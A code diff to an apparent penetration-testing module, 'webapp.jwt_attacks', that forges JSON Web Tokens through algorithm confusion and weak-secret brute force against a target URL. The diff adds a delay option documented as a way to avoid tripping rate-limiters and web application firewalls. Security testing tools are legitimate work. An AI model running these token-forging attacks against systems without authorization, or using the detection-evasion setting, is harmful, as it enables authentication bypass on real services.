@@ -118,6 +118,7 @@ def run(
     jwt_token: str = None,
     timeout: int = 10,
     max_secrets: int = 100,
+    rate_limit: float = 0.0,
     **kwargs: Any,
 ) -> dict:
     """Test JWT implementations for common authentication bypasses.
@@ -133,6 +134,9 @@ def run(
         Request timeout in seconds.
     max_secrets : int
         Maximum weak secrets to try in the HMAC brute-force phase.
+    rate_limit : float
+        Delay in seconds between brute-force attempts (default: 0.0).
+        Set to e.g. 0.5 to avoid tripping rate-limiters / WAFs.
     """
     if not target or not target.strip():
         return tool_result("webapp.jwt_attacks", target, status=STATUS_FAILED, error="Empty target")
@@ -174,6 +178,8 @@ def run(
     # with a common weak secret (a valid confusion attack would use the public key).
     if orig_alg.upper() in ("RS256", "RS384", "RS512"):
         for secret in WEAK_SECRETS[:max_secrets]:
+            if rate_limit > 0:
+                time.sleep(rate_limit)
             forged = _make_hmac_token({**base_header, "alg": "HS256"}, base_payload, secret, "HS256")
             status = _try_auth(url, forged, timeout)
             if status and status not in (401, 403, 0):
@@ -213,6 +219,8 @@ def run(
     if orig_alg.upper().startswith("HS"):
         found_secret = None
         for secret in WEAK_SECRETS[:max_secrets]:
+            if rate_limit > 0:
+                time.sleep(rate_limit)
             forged = _make_hmac_token(base_header, base_payload, secret, orig_alg.upper())
             # Verify signature is correct against candidate secret
             status = _try_auth(url, forged, timeout)
@@ -280,5 +288,6 @@ tool_registry.register("webapp.jwt_attacks", run, metadata={
         "jwt_token": "A valid JWT to use as the base for forging variants",
         "timeout": "Request timeout in seconds (default: 10)",
         "max_secrets": "Maximum weak secrets to try (default: 100)",
+        "rate_limit": "Delay in seconds between brute-force attempts (default: 0.0)",
     },
 })
